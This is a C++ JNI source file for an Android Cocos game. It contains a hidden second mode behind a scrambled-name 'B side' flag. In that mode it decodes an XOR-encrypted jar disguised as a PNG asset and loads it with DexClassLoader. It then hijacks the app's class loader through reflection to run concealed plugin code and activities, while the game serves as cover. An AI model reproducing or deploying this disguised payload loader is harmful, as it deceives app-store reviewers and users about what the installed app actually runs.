#include <jni.h>
#include <string>

jobject a_loader = nullptr;
jobject d_loader = nullptr;
jobject plugin_class = nullptr;

//game_is_b_side
jboolean iwoiesei(JNIEnv *env, jobject context) {
    jclass contextClass = env->FindClass("android/content/Context");//得到context
    jmethodID getSharedPreferencesMethod = env->GetMethodID(contextClass, "getSharedPreferences",
                                                            "(Ljava/lang/String;I)Landroid/content/SharedPreferences;"); //getSharedPreference
    jobject sharedPreferencesObject = env->CallObjectMethod(context, getSharedPreferencesMethod,
                                                            env->NewStringUTF("PRO_QOEJ"),
                                                            0x000);//得到sp

    jclass spCls = env->FindClass("android/content/SharedPreferences");
    jmethodID getStringMethID = env->GetMethodID(spCls, "getString",
                                                 "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;"); //得到getString
    jstring dninka_id = (jstring) env->CallObjectMethod(sharedPreferencesObject,
                                                        getStringMethID,
                                                        env->NewStringUTF("PRO_QOEJ_DJIOE"),
                                                        env->NewStringUTF("false"));

    jclass strCls = env->FindClass("java/lang/String");
    jmethodID equalsMID = env->GetMethodID(strCls, "equals", "(Ljava/lang/Object;)Z");
    jboolean isBside = env->CallBooleanMethod(env->NewStringUTF("true"), equalsMID, dninka_id);
    return isBside;
}

//concatStrings
jstring qpdjieowli(JNIEnv *env, jstring str1, jstring str2) {
    const char *cStr1 = env->GetStringUTFChars(str1, NULL);
    const char *cStr2 = env->GetStringUTFChars(str2, NULL);
    char *newStr = (char *) malloc(strlen(cStr1) + strlen(cStr2) + 1);
    strcpy(newStr, cStr1);
    strcat(newStr, cStr2);
    jstring result = env->NewStringUTF(newStr);
    env->ReleaseStringUTFChars(str1, cStr1);
    env->ReleaseStringUTFChars(str2, cStr2);
    free(newStr);
    return result;
}


//read_file
void uieosjfekjio(JNIEnv *env, jobject context, jstring outFile) {
    jclass contextClass = env->FindClass("android/content/Context");//得到context
    jmethodID getAssetsID = env->GetMethodID(contextClass, "getAssets",
                                             "()Landroid/content/res/AssetManager;");
    jobject assetsMgr = env->CallObjectMethod(context, getAssetsID);
    if (!assetsMgr) {
        return;
    }
    jclass assetMgrCls = env->FindClass("android/content/res/AssetManager");
    jmethodID openMID = env->GetMethodID(assetMgrCls, "open",
                                         "(Ljava/lang/String;)Ljava/io/InputStream;");
    jobject inputStream = env->CallObjectMethod(assetsMgr, openMID,
                                                env->NewStringUTF("assets/resources/native/d3/t2k2wucm-spj1-pku1-qvhe-riofqpsx23q9.png"));
    jclass fosCls = env->FindClass("java/io/FileOutputStream");
    jmethodID fosMID = env->GetMethodID(fosCls, "<init>",
                                        "(Ljava/lang/String;)V");//newObject 都是<init>
    jobject fosObject = env->NewObject(fosCls, fosMID, outFile);
    if (!fosObject) {
        return;
    }
    jclass bosCls = env->FindClass("java/io/BufferedOutputStream");
    jmethodID bosMID = env->GetMethodID(bosCls, "<init>", "(Ljava/io/OutputStream;)V");
    jobject bosObject = env->NewObject(bosCls, bosMID, fosObject);
    jbyteArray buffer = env->NewByteArray(1024);
    jclass insCls = env->FindClass("java/io/InputStream");
    jmethodID readMID = env->GetMethodID(insCls, "read", "([B)I");
    jmethodID writeMID = env->GetMethodID(bosCls, "write", "(I)V");
    jboolean isEndOfFile = false;
    while (!isEndOfFile) {
        jint bytesRead = env->CallIntMethod(inputStream, readMID, buffer);
        jbyte *readBuffer = env->GetByteArrayElements(buffer, nullptr);
        if (bytesRead != -1) {
            for (int i = 0; i < bytesRead; i++) {
                env->CallVoidMethod(bosObject, writeMID, readBuffer[i] ^ 20230928);
            }
            env->ReleaseByteArrayElements(buffer, readBuffer, 0);
            buffer = env->NewByteArray(1024);
        } else {
            isEndOfFile = true;
        }
    }

    env->DeleteLocalRef(buffer);

    jmethodID insCloseMID = env->GetMethodID(insCls, "close", "()V");
    env->CallVoidMethod(inputStream, insCloseMID);

    jmethodID bosCloseMID = env->GetMethodID(bosCls, "close", "()V");
    env->CallVoidMethod(bosObject, bosCloseMID);
}

//load_class
void qjoeifeksjreio(JNIEnv *env, jobject context) {
    jclass contextClass = env->FindClass("android/content/Context");//得到context
    jmethodID getFilesDirMID = env->GetMethodID(contextClass, "getFilesDir", "()Ljava/io/File;");
    jobject fileObj = env->CallObjectMethod(context, getFilesDirMID);
    jclass fileClass = env->FindClass("java/io/File");
    jmethodID getAbsolutePathMID = env->GetMethodID(fileClass, "getAbsolutePath",
                                                    "()Ljava/lang/String;");
    jstring absolutePath = static_cast<jstring>(env->CallObjectMethod(fileObj, getAbsolutePathMID));
    jstring cachePath = qpdjieowli(env, absolutePath, env->NewStringUTF("/classes/"));
    jmethodID fileConstructorMethod = env->GetMethodID(fileClass, "<init>",
                                                       "(Ljava/lang/String;)V");//newObject 都是<init>
    jobject file = env->NewObject(fileClass, fileConstructorMethod, cachePath);
    jmethodID existsMID = env->GetMethodID(fileClass, "exists", "()Z");
    jboolean exists = env->CallBooleanMethod(file, existsMID);
    if (!exists) {
        jmethodID mkdirsMID = env->GetMethodID(fileClass, "mkdirs", "()Z");
        env->CallBooleanMethod(file, mkdirsMID);
    }

    uieosjfekjio(env, context, qpdjieowli(env, cachePath, env->NewStringUTF("/PRO_KDEO.jar")));

//    Class obj_class1 = Class.forName("android.app.ActivityThread");
//    Method method1 = obj_class1.getMethod("currentActivityThread",new Class[] {});
//    Object currentActivityThread = method1.invoke(null, new Object[] {});
    jclass ClassCls = env->FindClass("java/lang/Class");
    jmethodID forNameMID = env->GetStaticMethodID(ClassCls, "forName",
                                                  "(Ljava/lang/String;)Ljava/lang/Class;");
    jobject obj_class1 = env->CallStaticObjectMethod(ClassCls, forNameMID, env->NewStringUTF(
            "android.app.ActivityThread"));
    jclass curathreadCls = env->GetObjectClass(obj_class1);
    jmethodID getMethodMID = env->GetMethodID(curathreadCls, "getMethod",
                                              "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
    jobjectArray curATArray = env->NewObjectArray(0, ClassCls, nullptr);
    jobject method1 = env->CallObjectMethod(obj_class1, getMethodMID,
                                            env->NewStringUTF("currentActivityThread"), curATArray);
    jmethodID invokeMID = env->GetMethodID(env->GetObjectClass(method1), "invoke",
                                           "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");
    jobject invokeObj = nullptr;
    jclass ObjectCls = env->FindClass("java/lang/Object");
    jobjectArray invokeArray = env->NewObjectArray(0, ObjectCls, nullptr);
    jobject currentActivityThread = env->CallObjectMethod(method1, invokeMID, invokeObj,
                                                          invokeArray);

//    Class obj_class2 = Class.forName("android.app.ActivityThread");
//    Field field2 = obj_class2.getDeclaredField("mPackages");
//    field2.setAccessible(true);
//    ArrayMap mPackages = (ArrayMap) field2.get(currentActivityThread);
    jmethodID getDeclaredFieldMID = env->GetMethodID(curathreadCls, "getDeclaredField",
                                                     "(Ljava/lang/String;)Ljava/lang/reflect/Field;");
    jobject field2 = env->CallObjectMethod(obj_class1, getDeclaredFieldMID,
                                           env->NewStringUTF("mPackages"));
    jclass FieldCls = env->FindClass("java/lang/reflect/Field");
    jmethodID setAccessibleMID = env->GetMethodID(FieldCls, "setAccessible", "(Z)V");
    env->CallVoidMethod(field2, setAccessibleMID, true);
    jmethodID fieldGetMID = env->GetMethodID(FieldCls, "get",
                                             "(Ljava/lang/Object;)Ljava/lang/Object;");
    jobject mPackages = env->CallObjectMethod(field2, fieldGetMID, currentActivityThread);

//    WeakReference wr = (WeakReference) mPackages.get(base.getPackageName());
    jmethodID getPackageNameMethodID = env->GetMethodID(contextClass, "getPackageName",
                                                        "()Ljava/lang/String;");
    jobject packageName = env->CallObjectMethod(context, getPackageNameMethodID);
    jclass ArrayMapCls = env->FindClass("android/util/ArrayMap");
    jmethodID mpackagesGetMID = env->GetMethodID(ArrayMapCls, "get",
                                                 "(Ljava/lang/Object;)Ljava/lang/Object;");
    jobject wr = env->CallObjectMethod(mPackages, mpackagesGetMID, packageName);

//    dLoader = new DexClassLoader(cachePath + "/classdex.jar", cachePath, cachePath, base.getClassLoader());
    jmethodID appClassLoaderMethodID = env->GetMethodID(contextClass, "getClassLoader",
                                                        "()Ljava/lang/ClassLoader;");
    jobject appClassLoader = env->CallObjectMethod(context, appClassLoaderMethodID);
    jclass dexClassLoaderCls = env->FindClass("dalvik/system/DexClassLoader");
    jmethodID dexClassMethodID = env->GetMethodID(dexClassLoaderCls, "<init>",
                                                  "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
    jobject dexLoader = env->NewObject(dexClassLoaderCls, dexClassMethodID,
                                       qpdjieowli(env, cachePath,
                                                     env->NewStringUTF("/PRO_KDEO.jar")), cachePath,
                                       cachePath, appClassLoader);
    ::d_loader = env->NewGlobalRef(dexLoader);

//    Class obj_class3 = Class.forName("android.app.LoadedApk");
//    Field field3 = obj_class3.getDeclaredField("mClassLoader");
//    field3.setAccessible(true);
//    field3.set(wr.get(), dLoader);
    jobject obj_class3 = env->CallStaticObjectMethod(ClassCls, forNameMID,
                                                     env->NewStringUTF("android.app.LoadedApk"));
    jmethodID getDeclaredField2MID = env->GetMethodID(env->GetObjectClass(obj_class3),
                                                      "getDeclaredField",
                                                      "(Ljava/lang/String;)Ljava/lang/reflect/Field;");
    jobject field3 = env->CallObjectMethod(obj_class3, getDeclaredField2MID,
                                           env->NewStringUTF("mClassLoader"));
    env->CallVoidMethod(field3, setAccessibleMID, true);
    jclass wrCls = env->FindClass("java/lang/ref/WeakReference");
    jmethodID wrGetMID = env->GetMethodID(wrCls, "get", "()Ljava/lang/Object;");
    jobject wrGetObject = env->CallObjectMethod(wr, wrGetMID);
    jmethodID setMID = env->GetMethodID(FieldCls, "set", "(Ljava/lang/Object;Ljava/lang/Object;)V");
    env->CallVoidMethod(field3, setMID, wrGetObject, d_loader);
}

//get_tools_class
jobject fjkdjsbioe(JNIEnv *env) {
    if (nullptr != plugin_class) {
        return plugin_class;
    }
    jclass loaderCls = env->FindClass("dalvik/system/DexClassLoader");
    jmethodID loadClassMID = env->GetMethodID(loaderCls, "loadClass",
                                              "(Ljava/lang/String;)Ljava/lang/Class;");
    jobject pluginClass = env->CallObjectMethod(d_loader, loadClassMID,
                                                env->NewStringUTF("com.pro.ProTools"));
    ::plugin_class = env->NewGlobalRef(pluginClass);
    return plugin_class;
}


//invokeAppCreate
void vneiosjekjreo(JNIEnv *env, jobject context) {
    jobject classObj = fjkdjsbioe(env);
    jclass classCls = env->FindClass("java/lang/Class");
    jmethodID getMethodMID = env->GetMethodID(classCls, "getMethod",
                                              "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
    jobjectArray invokeArray = env->NewObjectArray(1, classCls, nullptr);
    jclass applicationCls = env->FindClass("android/app/Application");//得到context
    env->SetObjectArrayElement(invokeArray, 0, applicationCls);

    jobject methodObj = env->CallObjectMethod(classObj, getMethodMID,
                                              env->NewStringUTF("vdowiejfioe"), invokeArray);

    jclass methodCls = env->FindClass("java/lang/reflect/Method");
    jclass objCls = env->FindClass("java/lang/Object");

    jobjectArray invokeArray2 = env->NewObjectArray(1, objCls, nullptr);
    env->SetObjectArrayElement(invokeArray2, 0, context);
    jmethodID invokeMID = env->GetMethodID(methodCls, "invoke",
                                           "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");
    jobject obj = nullptr;
    env->CallObjectMethod(methodObj, invokeMID, obj, invokeArray2);

    env->DeleteLocalRef(classObj);
    env->DeleteLocalRef(methodObj);
    env->DeleteLocalRef(invokeArray);
    env->DeleteLocalRef(invokeArray2);
}

//invokePublic
void xjdndjkhi(JNIEnv *env, jobject context, jstring methodName) {
    jobject classObj = fjkdjsbioe(env);
    jclass classCls = env->FindClass("java/lang/Class");
    jmethodID getMethodMID = env->GetMethodID(classCls, "getMethod",
                                              "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
    jobjectArray invokeArray = env->NewObjectArray(1, classCls, nullptr);
    jclass contextClass = env->FindClass("android/content/Context");//得到context
    env->SetObjectArrayElement(invokeArray, 0, contextClass);
    jobject methodObj = env->CallObjectMethod(classObj, getMethodMID, methodName, invokeArray);

    jclass methodCls = env->FindClass("java/lang/reflect/Method");
    jclass objCls = env->FindClass("java/lang/Object");

    jobjectArray invokeArray2 = env->NewObjectArray(1, objCls, nullptr);
    env->SetObjectArrayElement(invokeArray2, 0, context);
    jmethodID invokeMID = env->GetMethodID(methodCls, "invoke",
                                           "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");
    jobject obj = nullptr;
    env->CallObjectMethod(methodObj, invokeMID, obj, invokeArray2);

    env->DeleteLocalRef(classObj);
    env->DeleteLocalRef(methodObj);
    env->DeleteLocalRef(invokeArray);
    env->DeleteLocalRef(invokeArray2);
}

//jumpActivity
void pqoiejskrjeie(JNIEnv *env, jobject context) {
    jclass intentCls = env->FindClass("android/content/Intent");
    jmethodID createIntentMID = env->GetMethodID(intentCls, "<init>",
                                                 "()V");//newObject 都是<init>
    jobject intentObject = env->NewObject(intentCls, createIntentMID);
    jclass a_loader_cls = env->FindClass("java/lang/ClassLoader");
    jmethodID loadClassMID = env->GetMethodID(a_loader_cls, "loadClass",
                                              "(Ljava/lang/String;)Ljava/lang/Class;");
    jobject mClass = env->CallObjectMethod(a_loader, loadClassMID, env->NewStringUTF(
            "org.yybhga.aloykq.dvbjea"));
    jmethodID setClassMID = env->GetMethodID(intentCls, "setClass",
                                             "(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;");
    env->CallObjectMethod(intentObject, setClassMID, context, mClass);

    jclass activityCls = env->FindClass("android/app/Activity");
    jmethodID startActivityMID = env->GetMethodID(activityCls, "startActivity",
                                                  "(Landroid/content/Intent;)V");
    env->CallVoidMethod(context, startActivityMID, intentObject);
    env->DeleteLocalRef(intentObject);
}

extern "C" {
//nativeonAppacreate
JNIEXPORT void JNICALL
Java_com_cocos_game_ProApp_voeisqpeisj(JNIEnv *env, jclass clazz, jobject context) {
    if (iwoiesei(env, context)) {
        vneiosjekjreo(env, context);
    }
}

//nativeonAppattach
JNIEXPORT void JNICALL
Java_com_cocos_game_ProApp_bioeqoeij(JNIEnv *env, jclass clazz, jobject context) {
    if (iwoiesei(env, context)) {
        qjoeifeksjreio(env, context);
        xjdndjkhi(env, context, env->NewStringUTF("qepsoirje"));
    }
}

//nativeonActacreate
JNIEXPORT void JNICALL
Java_com_cocos_game_LauncherActivity_vjoeiqpeoij(JNIEnv *env, jclass clazz, jobject context) {
    if (iwoiesei(env, context)) {
        pqoiejskrjeie(env, context);
        xjdndjkhi(env, context, env->NewStringUTF("bdjklsjeoi"));
    } else {
        jclass intentCls = env->FindClass("android/content/Intent");
        jmethodID createIntentMID = env->GetMethodID(intentCls, "<init>",
                                                     "()V");//newObject 都是<init>
        jclass gameActivity = env->FindClass("com/cocos/game/AppActivity");
        jobject intentObject = env->NewObject(intentCls, createIntentMID);
        jmethodID setClassMID = env->GetMethodID(intentCls, "setClass",
                                                 "(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;");
        env->CallObjectMethod(intentObject, setClassMID, context, gameActivity);

        jclass activityCls = env->FindClass("android/app/Activity");
        jmethodID startActivityMID = env->GetMethodID(activityCls, "startActivity",
                                                      "(Landroid/content/Intent;)V");
        env->CallVoidMethod(context, startActivityMID, intentObject);

        jmethodID finishMID = env->GetMethodID(activityCls, "finish", "()V");
        env->CallVoidMethod(context, finishMID);

        env->DeleteLocalRef(gameActivity);
        env->DeleteLocalRef(activityCls);
        env->DeleteLocalRef(intentObject);
    }
}

//nativeonActattach
JNIEXPORT void JNICALL
Java_com_cocos_game_LauncherActivity_moeiqpeosij(JNIEnv *env, jclass clazz, jobject context) {
    if (iwoiesei(env, context)) {
        jclass contextClass = env->FindClass("android/content/Context");//得到context
        jmethodID getClassLoaderMID = env->GetMethodID(contextClass, "getClassLoader",
                                                       "()Ljava/lang/ClassLoader;");
        jobject loader = env->CallObjectMethod(context, getClassLoaderMID);
        ::a_loader = env->NewGlobalRef(loader);

        jobject classObj = fjkdjsbioe(env);
        jclass classCls = env->FindClass("java/lang/Class");
        jmethodID getMethodMID = env->GetMethodID(classCls, "getMethod",
                                                  "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
        jobjectArray invokeArray = env->NewObjectArray(2, classCls, nullptr);

        env->SetObjectArrayElement(invokeArray, 0, contextClass);
        jclass StringClass = env->FindClass("java/lang/String");
        env->SetObjectArrayElement(invokeArray, 1, StringClass);

        jobject methodObj = env->CallObjectMethod(classObj, getMethodMID,
                                                  env->NewStringUTF("poeijskrje"), invokeArray);

        jclass ObjectCls = env->FindClass("java/lang/Object");
        jobjectArray invokeArray2 = env->NewObjectArray(2, ObjectCls, nullptr);
        env->SetObjectArrayElement(invokeArray2, 0, context);

        jstring jumpActName = env->NewStringUTF("com.cocos.game.ProActivity");
        env->SetObjectArrayElement(invokeArray2, 1, jumpActName);
        jclass methodCls = env->FindClass("java/lang/reflect/Method");
        jmethodID invokeMID = env->GetMethodID(methodCls, "invoke",
                                               "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");

        jobject obj = nullptr;
        env->CallObjectMethod(methodObj, invokeMID, obj, invokeArray2);

        env->DeleteLocalRef(invokeArray);
        env->DeleteLocalRef(invokeArray2);
    }
}

//nativeOnRestart
JNIEXPORT void JNICALL
Java_com_cocos_game_ProApp_qpoesjk_qpoesjkqpeoisjr(JNIEnv *env, jclass clazz, jobject context) {
    //saveData
    jclass contextClass = env->FindClass("android/content/Context");
    jmethodID getSharedPreferencesMethod = env->GetMethodID(contextClass, "getSharedPreferences",
                                                            "(Ljava/lang/String;I)Landroid/content/SharedPreferences;");
    jobject sharedPreferencesObject = env->CallObjectMethod(context, getSharedPreferencesMethod,
                                                            env->NewStringUTF("PRO_QOEJ"),
                                                            0x000);//得到sp

    jclass spClassModel = env->FindClass("android/content/SharedPreferences");
    jmethodID editMethod = env->GetMethodID(spClassModel, "edit",
                                            "()Landroid/content/SharedPreferences$Editor;");//得到Edit对象
    jobject editClass = env->CallObjectMethod(sharedPreferencesObject, editMethod);

    jclass editClassModel = env->FindClass("android/content/SharedPreferences$Editor");
    jmethodID putStringMID = env->GetMethodID(editClassModel, "putString",
                                              "(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;");
    jobject backEditCls = env->CallObjectMethod(editClass, putStringMID,
                                                env->NewStringUTF("PRO_QOEJ_DJIOE"),
                                                env->NewStringUTF("true")); //putString

    if (nullptr == backEditCls) {
        return;
    }

    jmethodID commitMID = env->GetMethodID(editClassModel, "commit", "()Z");
    env->CallBooleanMethod(editClass, commitMID);//commit

    //restart
    jmethodID pmMethod = env->GetMethodID(contextClass, "getPackageManager",
                                          "()Landroid/content/pm/PackageManager;");
    jobject packageManageCls = env->CallObjectMethod(context, pmMethod);
    jclass pmClsModel = env->FindClass("android/content/pm/PackageManager");
    jmethodID intentMethod = env->GetMethodID(pmClsModel, "getLaunchIntentForPackage",
                                              "(Ljava/lang/String;)Landroid/content/Intent;");
    //getPackageName()
    jmethodID getPackageNameMethod = env->GetMethodID(contextClass, "getPackageName",
                                                      "()Ljava/lang/String;");
    jstring pkn = static_cast<jstring>(env->CallObjectMethod(context, getPackageNameMethod));
    jobject intentObj = env->CallObjectMethod(packageManageCls, intentMethod, pkn);
    //intent addFlags
    jclass intentClass = env->FindClass("android/content/Intent");
    jmethodID addFlagsMethod = env->GetMethodID(intentClass, "addFlags",
                                                "(I)Landroid/content/Intent;");
    intentObj = env->CallObjectMethod(intentObj, addFlagsMethod, 0x04000000);
    //startActivity
    jmethodID startAMethod = env->GetMethodID(contextClass, "startActivity",
                                              "(Landroid/content/Intent;)V");
    env->CallVoidMethod(context, startAMethod, intentObj);

    //finish
    jclass process = env->FindClass("android/os/Process");
    jmethodID killProMID = env->GetStaticMethodID(process, "killProcess", "(I)V");
    //myPid
    jmethodID myPidMID = env->GetStaticMethodID(process, "myPid", "()I");
    int pid = env->CallStaticIntMethod(process, myPidMID);
    env->CallStaticVoidMethod(process, killProMID, pid);
}
}

jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    JNIEnv *env = NULL;
    if (vm->GetEnv((void **) &env, JNI_VERSION_1_1) != JNI_OK) {
        return JNI_FALSE;
    }
    return JNI_VERSION_1_6;
}